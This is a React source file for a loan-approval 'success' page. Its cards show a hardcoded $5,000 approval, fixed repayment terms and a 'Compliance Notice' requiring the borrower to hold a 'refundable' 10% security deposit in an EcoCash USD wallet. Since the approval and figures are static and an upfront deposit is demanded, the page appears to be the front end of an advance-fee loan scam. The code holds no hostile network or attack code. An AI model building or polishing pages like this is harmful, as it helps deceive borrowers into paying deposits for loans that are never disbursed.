import React from 'react';
import { Check, AlertTriangle } from 'lucide-react';

export const LoanApprovalCard: React.FC = () => {
  return (
    <div className="flex min-h-screen items-center justify-center bg-gradient-to-r from-sky-400 to-blue-500 p-4 font-sans">
      <div className="w-full max-w-2xl rounded-2xl bg-white p-6 shadow-xl sm:p-10 md:p-12">
        {/* Success Check Icon */}
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 text-white shadow-sm sm:h-20 sm:w-20">
          <Check className="h-8 w-8 stroke-[3] sm:h-10 sm:w-10" />
        </div>

        {/* Header Section */}
        <div className="mt-6 text-center">
          <h1 className="flex items-center justify-center gap-2 text-2xl font-bold text-slate-800 sm:text-3xl">
            <span>🎉</span> Congratulations!
          </h1>
          <p className="mt-3 text-sm text-slate-500 sm:text-base">
            Your loan has been <span className="font-semibold text-slate-700">approved!</span> The funds will be disbursed shortly.
          </p>
        </div>

        {/* Approved Amount Box */}
        <div className="mt-8 rounded-xl bg-gradient-to-r from-indigo-500 to-purple-600 p-5 text-center text-white shadow-md sm:mt-10 sm:p-6">
          <span className="text-xs font-semibold tracking-wider uppercase opacity-90 sm:text-sm">
            Approved Amount
          </span>
          <div className="mt-1 text-3xl font-extrabold sm:text-4xl md:text-5xl">
            $5,000
          </div>
        </div>

        {/* Compliance Notice Box */}
        <div className="mt-6 rounded-xl border border-amber-200 bg-amber-50/50 p-5 sm:mt-8 sm:p-6">
          <div className="flex items-center gap-2 text-xs font-bold tracking-wider text-amber-700 uppercase sm:text-sm">
            <AlertTriangle className="h-4 w-4 text-amber-600 sm:h-5 sm:w-5" />
            Compliance Notice
          </div>
          <p className="mt-3 text-xs leading-relaxed text-amber-900 sm:text-sm">
            Your EcoCash account must be active and maintain a security deposit of at least{' '}
            <span className="font-bold">10% of your requested loan amount IN USD WALLET.</span> This
            deposit is fully refundable upon successful loan repayment.
          </p>
        </div>
      </div>
    </div>
  );
};




import { CreditCard, Banknote, Calendar, Percent } from 'lucide-react';

export const LoanDetailsCard: React.FC = () => {
  return (
    <div className="flex  items-center justify-center bg-gradient-to-r from-sky-400 to-blue-500 p-4 font-sans">
      <div className="w-full max-w-2xl rounded-2xl bg-white p-6 shadow-xl sm:p-10 md:p-12">
        
        {/* Header Section */}
        <div className="flex items-center gap-3 border-b border-slate-100 pb-5">
          <div className="text-sky-500">
            <CreditCard className="h-6 w-6 stroke-[2.5]" />
          </div>
          <h2 className="text-xl font-bold text-slate-800 sm:text-2xl">
            Loan Details
          </h2>
        </div>

        {/* Details List */}
        <div className="divide-y divide-slate-100">
          
          {/* Monthly Payment */}
          <div className="flex items-center gap-4 py-5 sm:gap-5">
            <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 text-white shadow-md">
              <Banknote className="h-6 w-6 text-emerald-300" />
            </div>
            <div className="flex flex-col">
              <span className="text-xs font-bold tracking-wider text-slate-400 uppercase">
                Monthly Payment
              </span>
              <span className="text-lg font-extrabold text-slate-800 sm:text-xl">
                $296.49
              </span>
            </div>
          </div>

          {/* Loan Term */}
          <div className="flex items-center gap-4 py-5 sm:gap-5">
            <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 text-white shadow-md">
              <Calendar className="h-6 w-6 text-indigo-200" />
            </div>
            <div className="flex flex-col">
              <span className="text-xs font-bold tracking-wider text-slate-400 uppercase">
                Loan Term
              </span>
              <span className="text-lg font-extrabold text-slate-800 sm:text-xl">
                19 Months
              </span>
            </div>
          </div>

          {/* Interest Rate */}
          <div className="flex items-center gap-4 pt-5 sm:gap-5">
            <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 text-white shadow-md">
              <Percent className="h-5 w-5 text-indigo-100" />
            </div>
            <div className="flex flex-col">
              <span className="text-xs font-bold tracking-wider text-slate-400 uppercase">
                Interest Rate
              </span>
              <span className="text-lg font-extrabold text-slate-800 sm:text-xl">
                8% APR
              </span>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
};

import { Wallet, ArrowDownCircle, FileText, ArrowRightCircle, Home } from 'lucide-react';

export const QuickActionsCard: React.FC = () => {
  return (
    <div className="flex  flex-col items-center justify-center bg-gradient-to-r from-sky-400 to-blue-500 p-4 font-sans">
      <div className="w-full max-w-2xl">
        {/* Main Section Header */}
        <h2 className="mb-4 text-center text-lg font-bold text-white sm:text-xl">
          Quick Actions
        </h2>

        {/* Action Elements Stack */}
        <div className="space-y-3 sm:space-y-4">
          
          {/* Deposit Funds Button */}
          {/* <button className="flex w-full items-center justify-center gap-2 rounded-xl bg-white py-4 text-sm font-semibold text-indigo-600 shadow-md transition hover:bg-slate-50 active:scale-[0.99] sm:py-5 sm:text-base">
            <Wallet className="h-5 w-5 text-amber-500" />
            <span>Deposit Funds</span>
          </button> */}

          {/* Withdraw Funds Button */}
          {/* <button className="flex w-full items-center justify-center gap-2 rounded-xl bg-white py-4 text-sm font-semibold text-indigo-600 shadow-md transition hover:bg-slate-50 active:scale-[0.99] sm:py-5 sm:text-base">
            <ArrowDownCircle className="h-5 w-5 text-emerald-500" />
            <span>Withdraw Funds</span>
          </button> */}

          {/* Loan Details Button */}
          {/* <button className="flex w-full items-center justify-center gap-2 rounded-xl bg-white py-4 text-sm font-semibold text-indigo-600 shadow-md transition hover:bg-slate-50 active:scale-[0.99] sm:py-5 sm:text-base">
            <FileText className="h-5 w-5 text-purple-400" />
            <span>Loan Details</span>
          </button> */}

          {/* Next Steps Info Box */}
          <div className="rounded-xl bg-white p-5 shadow-md sm:p-6">
            <div className="flex items-center gap-2 text-sm font-bold text-indigo-600 sm:text-base">
              <ArrowRightCircle className="h-5 w-5 text-purple-600" />
              <span>Next Steps:</span>
            </div>
            <p className="mt-2 text-xs leading-relaxed text-slate-500 sm:text-sm">
              You will receive an SMS and email with disbursement details within 24 hours.
            </p>
          </div>

          {/* Return to Home Button */}
          <a href="/" className="flex w-full items-center justify-center gap-2 rounded-xl bg-white py-4 text-sm font-semibold text-indigo-600 shadow-md transition hover:bg-slate-50 active:scale-[0.99] sm:py-5 sm:text-base">
            <Home className="h-5 w-5 text-orange-500" />
            <span>Return to Home</span>
          </a>

        </div>
      </div>
    </div>
  );
};




export default function SuccesspAge (){
  return (
    <>
    <LoanApprovalCard/>
    <LoanDetailsCard/>
    <QuickActionsCard/>
    
    </>
  )
};